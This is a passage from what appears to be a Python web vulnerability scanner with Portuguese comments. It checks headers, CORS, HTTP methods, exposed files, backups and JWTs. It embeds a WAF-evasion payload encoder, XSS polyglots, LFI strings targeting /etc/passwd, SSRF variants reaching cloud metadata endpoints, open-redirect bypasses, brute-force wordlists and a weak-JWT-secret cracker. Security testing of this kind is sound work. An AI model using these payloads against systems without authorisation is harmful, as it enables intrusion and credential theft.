                info.get("host", "?"), "sensitive_data", "CRITICAL",
                f"SSRF CONFIRMADO (OOB) no parametro '{info.get('param','?')}'",
                f"o alvo fez uma requisicao {method} de saida para o webhook "
                f"(IP de origem {src_ip}, em {when}) — prova out-of-band, sem falso positivo",
                info.get("injected", ""),
                f"callback recebido: {self.base}/{canary} | ip-alvo={src_ip}",
                method="GET", confidence="alta"))
        return len(confirmed)

# --------------------------------------------------------------------------- #
# Motor de transformacao/encoding de payloads (teste de bypass de filtro/WAF)
# --------------------------------------------------------------------------- #
# Codigos tipicos de bloqueio de WAF/filtro (indicam que o payload cru foi barrado)
WAF_BLOCK_CODES = {403, 406, 419, 429, 501, 999, 418}
WAF_BLOCK_SIGNS = re.compile(
    r"(?i)access denied|forbidden|blocked|not acceptable|waf|mod_security|modsecurity|"
    r"request rejected|security violation|malicious|suspicious|incident id|cloudflare|"
    r"attack detected|firewall")


def _enc_url(s):
    return quote(s, safe="")


def _enc_double_url(s):
    return quote(quote(s, safe=""), safe="")


def _enc_base64(s):
    return base64.b64encode(s.encode()).decode()


def _enc_hex_percent(s):
    return "".join("%%%02x" % b for b in s.encode())


def _enc_unicode_js(s):
    return "".join("\\u%04x" % ord(c) for c in s)


def _enc_html_dec(s):
    return "".join("&#%d;" % ord(c) for c in s)


def _enc_html_hex(s):
    return "".join("&#x%x;" % ord(c) for c in s)


def _mut_mixed_case(s):
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))


def _mut_ws_comment(s):
    return s.replace(" ", "/**/")


def _mut_ws_tab(s):
    return s.replace(" ", "%09")


def _mut_ws_plus(s):
    return s.replace(" ", "+")


def _enc_chain_url_b64_url(s):
    return _enc_url(_enc_base64(_enc_url(s)))


# (rotulo, funcao) - cada rotulo descreve a tecnica de evasao
PAYLOAD_ENCODERS = [
    ("url-encode", _enc_url),
    ("double-url-encode", _enc_double_url),
    ("hex-percent", _enc_hex_percent),
    ("unicode-escape", _enc_unicode_js),
    ("html-entities-dec", _enc_html_dec),
    ("html-entities-hex", _enc_html_hex),
    ("mixed-case", _mut_mixed_case),
    ("whitespace-comment", _mut_ws_comment),
    ("whitespace-tab", _mut_ws_tab),
    ("chained-url-b64-url", _enc_chain_url_b64_url),
]


def payload_variants(base, encoders=None):
    """Gera variacoes encodadas/ofuscadas de um payload (para tentar bypass de filtro)."""
    encoders = encoders if encoders is not None else PAYLOAD_ENCODERS
    out, seen = [], {base}
    for label, fn in encoders:
        try:
            v = fn(base)
        except Exception:
            continue
        if v and v != base and v not in seen:
            seen.add(v)
            out.append((label, v))
    return out


# Polyglots conhecidos (validos/interpretaveis em multiplos contextos)
XSS_POLYGLOTS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=1)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=1//>",
    "'\"><img src=x onerror=1>",
    "\"><svg/onload=1>",
]
# variacoes de traversal (LFI) cobrindo encoding/obfuscacao
LFI_TRAVERSAL_VARIANTS = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",          # double-url
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",            # overlong utf-8
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..\\..\\..\\..\\etc\\passwd",                   # backslash
]
# breakers de SQL para gerar variantes de evasao
SQLI_EVASION_BASES = ["'", "' OR '1'='1", "1 AND 1=1", "1' AND '1'='1"]

# SSRF: representacoes ALTERNATIVAS do endpoint de metadata (bypass de filtro por IP/host)
# 169.254.169.254 == decimal 2852039166 == 0xA9FEA9FE == octal 0251.0376.0251.0376
SSRF_EVASION_VARIANTS = [
    ("decimal-ip", "http://2852039166/latest/meta-data/"),
    ("hex-ip", "http://0xA9FEA9FE/latest/meta-data/"),
    ("octal-ip", "http://0251.0376.0251.0376/latest/meta-data/"),
    ("ipv6-mapped", "http://[::ffff:169.254.169.254]/latest/meta-data/"),
    ("gcp-hostname", "http://metadata.google.internal/computeMetadata/v1/"),
    ("aws-shortener", "http://169.254.169.254.nip.io/latest/meta-data/"),
]
# Open redirect: truques estruturais (contra filtros que bloqueiam http:// ou o esquema)
REDIRECT_EVASION_VARIANTS = [
    ("slash-slash", "//" + OOB_MARKER + "/"),
    ("backslash-slash", "/\\" + OOB_MARKER + "/"),
    ("triple-slash", "///" + OOB_MARKER + "/"),
    ("scheme-noslash", "https:" + OOB_MARKER + "/"),
    ("whitespace-prefix", "%09//" + OOB_MARKER + "/"),
    ("encoded-slashes", "/%2f%2f" + OOB_MARKER + "/"),
    ("cr-lf-prefix", "%0d%0a//" + OOB_MARKER + "/"),
]
# wordlist para descoberta de parametros ocultos (param mining)
PARAM_MINING_WORDLIST = [
    "id", "page", "q", "query", "search", "s", "file", "path", "dir", "folder", "url", "uri",
    "redirect", "redirect_uri", "next", "return", "returnUrl", "goto", "dest", "continue",
    "user", "username", "uid", "account", "name", "email", "cat", "category", "type", "sort",
    "order", "lang", "locale", "view", "action", "cmd", "exec", "func", "callback", "debug",
    "test", "admin", "token", "key", "api_key", "apikey", "access", "role", "format", "output",
    "doc", "download", "item", "p", "ref", "source", "src", "data", "json", "xml", "id2",
]

# ------ Wordlist de subdominios para brute-force DNS ------
SUBDOMAIN_WORDLIST = [
    "www", "mail", "webmail", "smtp", "pop", "imap", "ftp", "sftp", "ns1", "ns2",
    "ns3", "dns", "mx", "mx1", "mx2", "vpn", "remote", "portal", "admin", "administrator",
    "adm", "panel", "cpanel", "whm", "dashboard", "api", "api-dev", "api-staging", "apis",
    "app", "apps", "mobile", "m", "dev", "development", "staging", "stage", "test", "testing",
    "qa", "uat", "sandbox", "demo", "beta", "alpha", "preview", "prod", "production", "live",
    "internal", "intranet", "corp", "private", "secure", "vault", "auth", "sso", "login",
    "account", "accounts", "id", "identity", "oauth", "console", "manage", "manager",
    "git", "gitlab", "github", "svn", "jenkins", "ci", "cd", "build", "deploy", "docker",
    "registry", "harbor", "nexus", "artifactory", "sonar", "jira", "confluence", "wiki",
    "docs", "documentation", "developer", "developers", "status", "health", "monitor",
    "monitoring", "grafana", "kibana", "prometheus", "metrics", "logs", "log", "elk",
    "db", "database", "mysql", "postgres", "mongo", "redis", "sql", "phpmyadmin", "pma",
    "adminer", "backup", "backups", "old", "new", "beta2", "cdn", "static", "assets",
    "img", "images", "media", "files", "download", "downloads", "upload", "uploads",
    "store", "shop", "cart", "checkout", "pay", "payment", "payments", "billing", "invoice",
    "crm", "erp", "hr", "support", "help", "helpdesk", "ticket", "tickets", "chat",
    "forum", "community", "blog", "news", "events", "careers", "jobs", "partner", "partners",
    "client", "clients", "customer", "customers", "user", "users", "member", "members",
    "web", "web1", "web2", "server", "host", "gateway", "proxy", "lb", "edge", "origin",
    "s3", "storage", "cloud", "aws", "azure", "gcp", "k8s", "kubernetes", "rancher",
    "email", "newsletter", "mailer", "mta", "relay", "ns", "autodiscover", "autoconfig",
    "owa", "exchange", "lync", "sip", "voip", "video", "conference", "meet", "zoom",
    "wp", "wordpress", "cms", "drupal", "joomla", "magento", "ftp2", "test2", "dev2",
    "staging2", "api2", "v1", "v2", "beta1", "demo2", "labs", "lab", "research", "data",
    "analytics", "bi", "report", "reports", "dashboard2", "office", "vpn2", "gw", "firewall",
]

# Palavras para permutacao ativa de subdominios (altdns-like)
PERM_WORDS = ["dev", "staging", "test", "qa", "uat", "prod", "api", "admin", "internal",
              "old", "new", "beta", "app", "www", "mobile", "secure", "vpn", "portal",
              "1", "2", "01", "02", "s", "backup", "demo", "stage", "live", "gw"]

# Wordlist embutida para brute-force de conteudo/diretorios (mini gobuster)
CONTENT_WORDLIST = [
    "admin", "administrator", "login", "logout", "signin", "signup", "register",
    "dashboard", "panel", "cpanel", "console", "manage", "manager", "account", "accounts",
    "profile", "settings", "config", "configuration", "setup", "install", "installer",
    "api", "api/v1", "api/v2", "rest", "graphql", "app", "apps", "mobile", "static",
    "assets", "public", "private", "internal", "secret", "secrets", "hidden", "data",
    "db", "database", "sql", "backup", "backups", "bak", "old", "new", "temp", "tmp",
    "test", "tests", "testing", "dev", "development", "stage", "staging", "prod", "demo",
    "upload", "uploads", "files", "file", "download", "downloads", "images", "img",
    "media", "docs", "doc", "documentation", "help", "support", "status", "health",
    "info", "debug", "trace", "log", "logs", "error", "errors", "report", "reports",
    "user", "users", "member", "members", "client", "clients", "customer", "customers",
    "order", "orders", "invoice", "invoices", "payment", "payments", "billing", "cart",
    "search", "export", "import", "sync", "webhook", "webhooks", "callback", "oauth",
    "token", "auth", "sso", "saml", "jwt", "session", "sessions", "cache", "store",
    "cms", "wp", "wordpress", "blog", "news", "forum", "wiki", "portal", "intranet",
    "phpmyadmin", "pma", "adminer", "server-status", "server-info", "metrics", "actuator",
    "swagger", "swagger-ui", "redoc", "graphiql", "playground", "monitor", "monitoring",
    "grafana", "kibana", "jenkins", "gitlab", "git", "svn", "ci", "build", "deploy",
    "includes", "include", "inc", "lib", "libs", "vendor", "node_modules", "src", "app_dev",
]


# --------------------------------------------------------------------------- #
# Achado
# --------------------------------------------------------------------------- #
class Finding:
    __slots__ = ("target", "category", "severity", "title", "detail", "url",
                 "evidence", "method", "curl", "confidence")

    def __init__(self, target, category, severity, title, detail="", url="", evidence="",
                 method="GET", curl="", confidence="alta"):
        self.target = target
        self.category = category
        self.severity = severity
        self.title = title
        self.detail = detail
        self.url = url
        self.evidence = evidence
        self.method = method
        self.curl = curl  # comando curl de reproducao (para bypass etc.)
        self.confidence = confidence  # alta / media / baixa (para triagem)

    def key(self):
        return (self.target, self.title, self.url)

    def to_dict(self):
        return {"target": self.target, "category": self.category, "severity": self.severity,
                "title": self.title, "detail": self.detail, "url": self.url,
                "evidence": self.evidence, "method": self.method, "curl": self.curl,
                "confidence": self.confidence}


class FindingBag:
    """Coletor thread-safe com dedupe e log verbose em tempo real."""
    def __init__(self, opts):
        self.lock = threading.Lock()
        self.items = []
        self.seen = set()
        self.opts = opts

    def add(self, f):
        # auto-gera o curl de reproducao para qualquer achado acionavel (url + metodo real)
        if not f.curl and f.url and f.method in REAL_HTTP_METHODS:
            f.curl = _curl_repro(f.url, f.method)
        with self.lock:
            k = f.key()
            if k in self.seen:
                return
            self.seen.add(k)
            self.items.append(f)
        # log em tempo real (fora do lock de lista, usa PRINT_LOCK)
        if self.opts["verbose"] >= 1:
            col = SEVERITY_COLOR.get(f.severity, lambda: "")()
            extra = f" {C.DIM}{f.url}{C.RESET}" if f.url else ""
            p(f"  {col}[{f.severity}]{C.RESET} {f.title}{extra}")
            if f.curl:
                p(f"      {C.DIM}-> validar:{C.RESET} {C.CYAN}{f.curl}{C.RESET}")

    def all(self):
        return list(self.items)


# --------------------------------------------------------------------------- #
# Verbose helpers
# --------------------------------------------------------------------------- #
def vlog(opts, level, msg):
    if opts["verbose"] >= level:
        p(msg)


def req_log(opts, method, url, status, extra=""):
    if opts["verbose"] >= 2:
        col = C.GREEN if (isinstance(status, int) and 200 <= status < 300) else \
              (C.YELLOW if isinstance(status, int) and 300 <= status < 400 else C.GREY)
        s = f"{status}" if status is not None else "ERR"
        p(f"    {C.DIM}{method:<7}{C.RESET} {url} {col}-> {s}{C.RESET} {C.DIM}{extra}{C.RESET}")


# --------------------------------------------------------------------------- #
# Requisicao central
# --------------------------------------------------------------------------- #
def do_request(sess, method, url, opts, **kwargs):
    kwargs.setdefault("timeout", opts["timeout"])
    kwargs.setdefault("allow_redirects", False)
    # backoff adaptativo: se o alvo comecou a devolver 429/503, espera antes de mandar
    if opts.get("adaptive") and STATS.backoff:
        time.sleep(STATS.backoff)
    try:
        r = sess.request(method, url, **kwargs)
        STATS.inc_req()
        # rate limiting detectado -> aumenta o backoff global e avisa uma vez
        if r.status_code in (429, 503) and opts.get("adaptive"):
            first, bo = STATS.note_throttle()
            if first:
                p(f"{C.YELLOW}[!]{C.RESET} Rate limiting detectado (HTTP {r.status_code}); "
                  f"reduzindo o ritmo automaticamente (backoff ate {bo:.1f}s).")
        elif r.status_code < 400 and opts.get("adaptive"):
            STATS.note_ok()
        req_log(opts, method, url, r.status_code,
                extra=f'{r.headers.get("Content-Type","")[:30]} {len(r.content)}b')
        if opts["delay"]:
            time.sleep(opts["delay"])
        return r
    except requests.RequestException as e:
        STATS.inc_req()
        STATS.inc_err()
        req_log(opts, method, url, None, extra=e.__class__.__name__)
        if opts["delay"]:
            time.sleep(opts["delay"])
        return None


# --------------------------------------------------------------------------- #
# Utilidades
# --------------------------------------------------------------------------- #
def normalize_target(raw):
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    if "://" not in raw:
        base_https = f"https://{raw}"; base_http = f"http://{raw}"; host = raw
    else:
        parsed = urlparse(raw)
        host = parsed.netloc
        if parsed.scheme == "https":
            base_https, base_http = f"https://{parsed.netloc}", f"http://{parsed.netloc}"
        else:
            base_https, base_http = f"https://{parsed.netloc}", f"http://{parsed.netloc}"
    return base_https.rstrip("/"), base_http.rstrip("/"), host.split("/")[0]


class _BlockCookies(cookiejar.DefaultCookiePolicy):
    """Politica que bloqueia o armazenamento de cookies (requisicoes sem estado)."""
    def set_ok(self, cookie, request):
        return False


def build_session(opts):
    sess = requests.Session()
    sess.headers.update({"User-Agent": opts["ua"], "Accept": "*/*", "Connection": "close"})
    sess.verify = opts["verify_tls"]
    if opts.get("no_session_cookies"):
        sess.cookies.set_policy(_BlockCookies())
    if opts["proxy"]:
        sess.proxies = {"http": opts["proxy"], "https": opts["proxy"]}
    if Retry is not None and opts["retries"] > 0:
        # connect=0/read=0: NAO repete em erro de conexao (falha rapido em alvos
        # que dropam o burst, ex: WAF/Cloudflare). Repete apenas em status 429/5xx.
        retry = Retry(total=opts["retries"], connect=0, read=0, status=opts["retries"],
                      backoff_factor=0.2, status_forcelist=[429, 500, 502, 503, 504],
                      allowed_methods=None, raise_on_status=False)
        adapter = HTTPAdapter(max_retries=retry, pool_maxsize=opts["path_threads"] + 5)
        sess.mount("http://", adapter)
        sess.mount("https://", adapter)
    return sess


def read_body(resp, limit=600000):
    ctype = resp.headers.get("Content-Type", "")
    if any(x in ctype for x in ("image/", "font/", "video/", "audio/", "application/octet")):
        return ""
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def raw_text(resp, limit=600000):
    """Texto cru, ignorando filtro de Content-Type (para source maps/JSON servidos como octet-stream)."""
    try:
        return resp.text[:limit]
    except Exception:
        return ""


# --------------------------------------------------------------------------- #
# Checks
# --------------------------------------------------------------------------- #
def check_reachability(sess, base_https, base_http, host, opts, bag):
    for base in (base_https, base_http):
        r = do_request(sess, "GET", base + "/", opts, allow_redirects=True)
        if r is not None:
            return base, r
    # Problemas reais de certificado sao tratados por check_tls (porta 443).
    # Aqui apenas fazemos fallback HTTPS -> HTTP sem gerar ruido.
    return None, None


def check_headers(host, base, resp, bag):
    headers = {k.lower(): v for k, v in resp.headers.items()}
    is_https = base.startswith("https")
    for h, (desc, sev) in SECURITY_HEADERS.items():
        if h == "strict-transport-security" and not is_https:
            continue
        if h not in headers:
            bag.add(Finding(host, "misconfig", sev, desc, "", base + "/"))
    for h, desc in DISCLOSURE_HEADERS.items():
        if h in headers:
            bag.add(Finding(host, "info_disclosure", "LOW", desc,
                            f"{h}: {headers[h]}", base + "/", headers[h]))
    set_cookie = resp.headers.get("Set-Cookie", "")
    if set_cookie:
        low = set_cookie.lower()
        if "httponly" not in low:
            bag.add(Finding(host, "misconfig", "LOW", "Cookie sem flag HttpOnly",
                            set_cookie[:120], base + "/"))
        if is_https and "secure" not in low:
            bag.add(Finding(host, "misconfig", "LOW", "Cookie sem flag Secure",
                            set_cookie[:120], base + "/"))
        if "samesite" not in low:
            bag.add(Finding(host, "misconfig", "INFO", "Cookie sem atributo SameSite",
                            set_cookie[:120], base + "/"))


def check_cors(sess, host, base, opts, bag):
    evil = "https://evil-attacker-test.example.com"
    r = do_request(sess, "GET", base + "/", opts, headers={"Origin": evil}, allow_redirects=True)
    if r is None:
        return
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    if acao == "*":
        sev = "MEDIUM" if acac.lower() == "true" else "LOW"
        bag.add(Finding(host, "misconfig", sev, "CORS permissivo (Allow-Origin: *)",
                        f"credentials={acac or 'false'}", base + "/", acao,
                        curl=_curl_repro(base + "/", headers={"Origin": evil}) + "   # confira Access-Control-Allow-Origin na resposta"))
    elif acao and evil in acao:
        sev = "HIGH" if acac.lower() == "true" else "MEDIUM"
        bag.add(Finding(host, "misconfig", sev, "CORS reflete Origin arbitraria",
                        f"Reflete origin do atacante (credentials={acac or 'false'})",
                        base + "/", acao,
                        curl=_curl_repro(base + "/", headers={"Origin": evil}) + "   # veja se Access-Control-Allow-Origin reflete o Origin"))
    # teste null origin
    r2 = do_request(sess, "GET", base + "/", opts, headers={"Origin": "null"}, allow_redirects=True)
    if r2 is not None and r2.headers.get("Access-Control-Allow-Origin", "") == "null":
        bag.add(Finding(host, "misconfig", "MEDIUM", "CORS aceita Origin null",
                        "Access-Control-Allow-Origin: null", base + "/",
                        curl=_curl_repro(base + "/", headers={"Origin": "null"}) + "   # veja se Access-Control-Allow-Origin: null"))


def check_http_methods(sess, host, base, opts, bag):
    r = do_request(sess, "OPTIONS", base + "/", opts)
    if r is None:
        return
    allow = r.headers.get("Allow", "") or r.headers.get("Access-Control-Allow-Methods", "")
    allow_up = allow.upper()
    dangerous = [m for m in ("PUT", "DELETE", "TRACE", "CONNECT", "PATCH") if m in allow_up]
    if dangerous:
        sev = "MEDIUM" if ("PUT" in dangerous or "DELETE" in dangerous) else "LOW"
        bag.add(Finding(host, "misconfig", sev, "Metodos HTTP perigosos habilitados",
                        f"Allow: {allow}", base + "/", allow, method="OPTIONS"))
    # TRACE (XST)
    rt = do_request(sess, "TRACE", base + "/", opts)
    if rt is not None and rt.status_code == 200 and "TRACE /" in (rt.text or "")[:200]:
        bag.add(Finding(host, "misconfig", "MEDIUM", "HTTP TRACE habilitado (XST)",
                        "Metodo TRACE refletiu a requisicao", base + "/", method="TRACE"))


def scan_body_for_secrets(host, url, text, bag, method="GET", in_file=False):
    if not text:
        return
    # padroes genericos/ruidosos -> confianca menor para triagem
    noisy = {"Endereco de e-mail", "Credencial em texto", "reCAPTCHA site key",
             "Chave publica SSH (recon)", "Bearer token exposto"}
    seen = set()
    for pattern, desc in SECRET_PATTERNS:
        if desc in LOW_CONFIDENCE_SECRETS and not in_file:
            continue
        m = pattern.search(text)
        if m and desc not in seen:
            seen.add(desc)
            ev = m.group(0)
            ev = (ev[:60] + "...") if len(ev) > 63 else ev
            sev = "CRITICAL" if in_file else "HIGH"
            if desc == "Endereco de e-mail":
                sev = "INFO"
            conf = "media" if desc in noisy else "alta"
            bag.add(Finding(host, "sensitive_data", sev,
                            f"Possivel segredo exposto: {desc}", "", url, ev, method,
                            confidence=conf))


def scan_body_for_errors(host, url, text, bag, method="GET"):
    if not text:
        return
    for pattern, desc in ERROR_PATTERNS:
        m = pattern.search(text)
        if m:
            bag.add(Finding(host, "info_disclosure", "MEDIUM",
                            f"Vazamento de erro/stack trace: {desc}", "", url,
                            m.group(0)[:90], method))
            break
    if DIR_LISTING_PATTERN.search(text):
        bag.add(Finding(host, "misconfig", "MEDIUM", "Directory listing habilitado", "", url, method=method))


def looks_like_soft_404(path, text, headers, status):
    ctype = headers.get("Content-Type", "").lower()
    low = text.lower()
    file_ext = path.rsplit(".", 1)[-1] if "." in path.split("/")[-1] else ""
    if file_ext in ("env", "sql", "bak", "config", "htpasswd", "npmrc", "pem", "key", "log") and "<html" in low:
        return True
    if file_ext in ("json", "yml", "yaml") and "<html" in low and "{" not in text[:200] and ":" not in text[:200]:
        return True
    if "<title>404" in low or "not found</title>" in low or "page not found" in low:
        return True
    return False


# --------------------------------------------------------------------------- #
# Calibracao de baseline por host (reducao de falsos positivos / catch-all)
# --------------------------------------------------------------------------- #
def _rand_token(n=12):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _content_fingerprint(body):
    """Assinatura estavel do conteudo: remove numeros/espacos e resume."""
    norm = re.sub(r"\d+", "N", (body or "")[:4000])
    norm = re.sub(r"\s+", " ", norm)
    return hashlib.md5(norm.encode("utf-8", "replace")).hexdigest()


def _token_set(body):
    """Conjunto de tokens (palavras) do conteudo, p/ similaridade fuzzy (Jaccard)."""
    return set(re.findall(r"[a-zA-Z]{3,}", (body or "")[:8000].lower()))


def _jaccard(a, b):
    if not a or not b:
        return 0.0
    inter = len(a & b)
    union = len(a | b)
    return inter / union if union else 0.0


class Baseline:
    __slots__ = ("catch_all", "status", "lengths", "fingerprints", "ctypes",
                 "tokensets", "stable_tokens")

    def __init__(self):
        self.catch_all = False       # devolve 200/generico para paths aleatorios (neste diretorio)
        self.status = None
        self.lengths = []
        self.fingerprints = set()
        self.ctypes = set()
        self.tokensets = []          # conjuntos de tokens dos probes (p/ Jaccard)
        self.stable_tokens = set()   # intersecao dos probes = template fixo (sem ruido de path)


def calibrate_baseline(sess, base, opts, prefix="/"):
    """Manda paths inexistentes sob 'prefix' e mede o comportamento (catch-all por diretorio)."""
    pre = prefix if prefix.endswith("/") else prefix + "/"
    probes = [f"{pre}{_rand_token(14)}", f"{pre}{_rand_token(12)}.php",
              f"{pre}{_rand_token(12)}/", f"{pre}{_rand_token(10)}.json",
              f"{pre}{_rand_token(11)}"]
    bl = Baseline()
    statuses = []
    for pp in probes:
        r = do_request(sess, "GET", base + pp, opts, allow_redirects=False)
        if r is None:
            continue
        statuses.append(r.status_code)
        body = read_body(r, 20000)
        bl.lengths.append(len(r.content))
        bl.fingerprints.add(_content_fingerprint(body))
        bl.ctypes.add(r.headers.get("Content-Type", "").split(";")[0].strip().lower())
        bl.tokensets.append(_token_set(body))
    if not statuses:
        return bl
    # template estavel = tokens comuns a TODOS os probes (remove o ruido do path echoado)
    if bl.tokensets:
        bl.stable_tokens = set.intersection(*bl.tokensets) if len(bl.tokensets) > 1 else set(bl.tokensets[0])
    non404 = [s for s in statuses if s != 404]
    if len(non404) >= len(statuses) - 1 and any(s in (200, 206, 301, 302) for s in non404):
        bl.catch_all = True
        bl.status = max(set(statuses), key=statuses.count)
        if prefix == "/":
            vlog(opts, 1, f"  {C.YELLOW}> baseline: host parece catch-all (aleatorios -> "
                          f"{bl.status}); filtrando falsos positivos{C.RESET}")
        else:
            vlog(opts, 2, f"      {C.YELLOW}(catch-all no diretorio {pre}){C.RESET}")
    return bl


def matches_baseline(bl, r, body):
    """True se a resposta parece o catch-all/erro generico (provavel falso positivo)."""
    if bl is None or not bl.catch_all or r is None:
        return False
    # 1. fingerprint identico
    if _content_fingerprint(body) in bl.fingerprints:
        return True
    # 2. tamanho quase identico a um dos baselines
    ln = len(body.encode("utf-8", "replace")) if isinstance(body, str) else len(body or b"")
    for blen in bl.lengths:
        if blen > 0 and abs(ln - blen) <= max(24, blen * 0.03):
            return True
    ts = _token_set(body)
    if ts:
        # 3. contencao do template estavel: catch-all que ecoa o path (conteudo varia um pouco,
        #    mas contem quase todo o template fixo do erro generico)
        st = bl.stable_tokens
        if len(st) >= 6 and len(st & ts) / len(st) >= 0.9:
            return True
        # 4. similaridade fuzzy (Jaccard >= 0.85) contra os probes
        for bts in bl.tokensets:
            if _jaccard(ts, bts) >= 0.85:
                return True
    return False


def _dir_prefix(path):
    """Diretorio pai do path (ate 2 segmentos) p/ baseline por diretorio."""
    pth = path.split("?")[0]
    if not pth.startswith("/"):
        pth = "/" + pth
    segs = [s for s in pth.split("/") if s]
    if len(segs) <= 1:
        return "/"
    return "/" + "/".join(segs[:-1][:2]) + "/"


def _baseline_for(sess, path):
    """Retorna o baseline do diretorio do path (calibra sob demanda, com lock por prefixo)."""
    base = getattr(sess, "_base", None)
    opts = getattr(sess, "_opts", None)
    baselines = getattr(sess, "_baselines", None)
    if baselines is None or base is None:
        return getattr(sess, "_baseline", None)
    prefix = _dir_prefix(path)
    if prefix == "/":
        return baselines.get("/")
    bl = baselines.get(prefix)      # caminho rapido (sem lock)
    if bl is not None:
        return bl
    with sess._bl_lock:
        if len(baselines) >= 40:
            return baselines.get("/")   # limite de diretorios -> usa root
        plock = sess._bl_locks.get(prefix)
        if plock is None:
            plock = threading.Lock()
            sess._bl_locks[prefix] = plock
    with plock:                     # serializa calibracao POR prefixo (evita corrida)
        bl = baselines.get(prefix)
        if bl is None:
            bl = calibrate_baseline(sess, base, opts, prefix)
            baselines[prefix] = bl
    return bl


def is_false_hit(sess, path, body, r):
    """Combina soft-404 + baseline do diretorio: True => provavel falso positivo, descartar."""
    status = r.status_code if r is not None else 0
    if looks_like_soft_404(path, body, r.headers if r is not None else {}, status):
        return True
    return matches_baseline(_baseline_for(sess, path), r, body)


def probe_path(sess, host, base, entry, opts, bag):
    path, desc, sev, cat = entry
    url = base + path
    r = do_request(sess, "GET", url, opts, stream=False)
    if r is None:
        return
    if r.status_code not in (200, 206):
        return
    text = read_body(r, limit=8192)
    if is_false_hit(sess, path, text, r):
        return
    clen = r.headers.get("Content-Length") or str(len(r.content))
    ev = f"HTTP {r.status_code}, {clen} bytes"
    bag.add(Finding(host, cat, sev, desc, f"Acessivel: {path}", url, ev))
    # scan de conteudo (segredos + erros) — arquivo sensivel => alta confianca
    scan_body_for_secrets(host, url, read_body(r), bag, in_file=True)
    scan_body_for_errors(host, url, text, bag)


def scan_sensitive_paths(sess, host, base, opts, bag):
    entries = SENSITIVE_PATHS + opts["wordlist_entries"]
    vlog(opts, 1, f"  {C.BLUE}> fuzzing de arquivos sensiveis ({len(entries)} paths){C.RESET}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=opts["path_threads"]) as ex:
        list(ex.map(lambda e: probe_path(sess, host, base, e, opts, bag), entries))


def probe_backup(sess, host, base, name, opts, bag):
    for ext in BACKUP_EXTENSIONS:
        path = "/" + name + ext
        url = base + path
        r = do_request(sess, "GET", url, opts)
        if r is None or r.status_code not in (200, 206):
            continue
        text = read_body(r, 8192)
        if is_false_hit(sess, path, text, r):
            continue
        clen = r.headers.get("Content-Length") or str(len(r.content))
        bag.add(Finding(host, "sensitive_data", "HIGH",
                        f"Backup/arquivo temporario exposto: {name}{ext}",
                        f"Acessivel: {path}", url, f"HTTP {r.status_code}, {clen} bytes"))
        scan_body_for_secrets(host, url, read_body(r), bag, in_file=True)


def scan_backups(sess, host, base, opts, bag):
    vlog(opts, 1, f"  {C.BLUE}> fuzzing de backups ({len(BACKUP_BASENAMES)}x{len(BACKUP_EXTENSIONS)}){C.RESET}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=opts["path_threads"]) as ex:
        list(ex.map(lambda n: probe_backup(sess, host, base, n, opts, bag), BACKUP_BASENAMES))


def scan_jwts(host, url, text, opts, bag, extra_tokens=None, ctx=None):
    """Encontra JWTs no texto/cookies e analisa cada um. ctx coleta tokens/segredos p/ bypass."""
    tokens = set(JWT_RE.findall(text or ""))
    if extra_tokens:
        tokens |= set(t for t in extra_tokens if t)
    for tok in list(tokens)[:5]:
        if ctx is not None:
            ctx["tokens"].add(tok)
        analyze_jwt(host, url, tok, opts, bag, ctx)


def _b64url_decode(s):
    s = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())


def _crack_hs_jwt(parts, alg):
    signing_input = (parts[0] + "." + parts[1]).encode()
    try:
        sig = _b64url_decode(parts[2])
    except Exception:
        return None
    hashfn = {"hs256": hashlib.sha256, "hs384": hashlib.sha384,
              "hs512": hashlib.sha512}.get(alg, hashlib.sha256)
    for secret in JWT_WEAK_SECRETS:
        mac = hmac.new(secret.encode(), signing_input, hashfn).digest()
        if hmac.compare_digest(mac, sig):
            return secret
    return None


def analyze_jwt(host, url, token, opts, bag, ctx=None):
    parts = token.split(".")
    if len(parts) < 2:
        return
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:
        return
    if not isinstance(payload, dict):
        return
    alg = str(header.get("alg", "")).lower()
    ev = token[:45] + "..."
    # curl para localizar o token na origem + one-liner para decodificar o payload localmente
    fetch_curl = _curl_repro(url) + f"   # procure o JWT na resposta: {ev}"
    decode_curl = (f"python3 -c \"import base64,json; "
                   f"t='{token}'.split('.'); "
                   f"pad=lambda s: s+'='*(-len(s)%4); "
                   f"print(json.loads(base64.urlsafe_b64decode(pad(t[1]))))\"")
    jwt_curl = fetch_curl + "  &&  " + decode_curl
    if alg == "none":
        bag.add(Finding(host, "misconfig", "HIGH", "JWT aceita alg:none (assinatura ignoravel)",
                        "header alg=none permite forjar tokens", url, ev, method="JWT", curl=jwt_curl))
    if alg.startswith("hs") and len(parts) == 3:
        secret = _crack_hs_jwt(parts, alg)
        if secret is not None:
            shown = secret if secret else "(vazio)"
            if ctx is not None:
                ctx["secrets"].add(secret)
            crack_curl = (f"python3 -c \"import hmac,hashlib,base64; "
                          f"si='{parts[0]}.{parts[1]}'.encode(); "
                          f"print(base64.urlsafe_b64encode(hmac.new(b'{shown}', si, hashlib.{('sha256' if alg=='hs256' else 'sha384' if alg=='hs384' else 'sha512')}).digest()).rstrip(b'=').decode())\""
                          f"   # deve bater com a assinatura do token acima")
            bag.add(Finding(host, "sensitive_data", "CRITICAL",
                            f"JWT assinado com segredo fraco: '{shown}'",
                            f"{alg.upper()} quebrado por dicionario", url, ev, method="JWT",
                            curl=crack_curl))
    sensitive = [k for k in payload if str(k).lower() in JWT_SENSITIVE_CLAIMS]
    if sensitive:
        vals = {k: payload[k] for k in sensitive[:5]}
